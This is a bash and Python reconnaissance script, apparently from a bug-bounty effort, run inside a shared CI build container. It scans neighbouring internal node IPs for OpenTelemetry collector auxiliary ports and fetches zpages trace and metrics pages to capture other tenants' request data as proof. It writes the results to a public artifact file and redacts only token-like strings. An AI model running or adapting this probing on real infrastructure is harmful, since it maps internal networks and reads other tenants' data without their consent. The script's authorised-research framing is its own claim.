#!/usr/bin/env bash
# H1 build-container recon v9 — LAST build-container thread: the OTLP collector's AUX ports.
# v8: only :4317 (OTLP gRPC, write-only) reachable across ALL build nodes (flat net). Everything else closed.
# OTLP collectors often expose aux HTTP ports that CAN leak cross-tenant data:
#   55679 zpages (/debug/tracez, /debug/servicez → RECENT SPANS = other tenants' request data!),
#   8888/8889 collector prometheus metrics, 4318 OTLP-HTTP, 13133 health, 1777 pprof.
# If zpages exposes other builds' spans → cross-tenant telemetry READ = real finding. FETCH content (proof).
# RoE-clean: read-only, metadata/first-bytes only, few nodes, single-connect. Researcher: abedalaziz123sayed.
set +e
PUB="public/recon9.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
p "=====RECON9 START====="
MYNODE="${HOST_NODE_IP:-172.16.6.1}"
p "id=$(id) myip=$(hostname -I 2>/dev/null) mynode=$MYNODE"

python3 - "$MYNODE" <<'PY' >> "$PUB"
import socket,sys,urllib.request
mynode=sys.argv[1]
# my node + a few neighbor gateways (flat net proven in v8)
nodes=[mynode,"172.16.0.1","172.16.1.1","172.16.5.1","172.16.7.1"]
aux={4318:"otlp-http",8888:"col-metrics",8889:"prom-exp",13133:"health",55679:"zpages",1777:"pprof",8125:"statsd",9411:"zipkin"}
print("## OTLP collector AUX ports across nodes:")
reachable=[]
for nd in nodes:
    op=[]
    for pt,nm in aux.items():
        s=socket.socket(); s.settimeout(1)
        try:
            s.connect((nd,pt)); op.append((pt,nm)); s.close()
        except Exception: pass
    if op:
        print(f"  {nd}: OPEN "+", ".join(f"{pt}({nm})" for pt,nm in op))
        for pt,nm in op: reachable.append((nd,pt,nm))
    else:
        print(f"  {nd}: none of aux ports open")

# FETCH content from any HTTP-ish aux port (zpages/metrics/health) — proof of what leaks
def get(url):
    try:
        r=urllib.request.urlopen(url,timeout=3)
        return r.status, r.read(600).decode('utf-8','replace')
    except Exception as e:
        return None, str(e)[:80]
print("## AUX content probe (first 600b):")
for nd,pt,nm in reachable:
    for path in (["/debug/tracez","/debug/servicez"] if pt==55679 else ["/metrics"] if pt in (8888,8889) else ["/"] ):
        code,body=get(f"http://{nd}:{pt}{path}")
        # redact anything that looks like a token/secret value from the preview
        import re
        body=re.sub(r'(?i)(token|secret|key|authorization|bearer)["\':=\s]+[A-Za-z0-9._\-]{8,}', r'\1=<REDACTED>', body)
        print(f"  {nd}:{pt}{path} -> {code} | {body[:280].strip()}")
PY
p "=====RECON9 END====="
cat "$PUB"
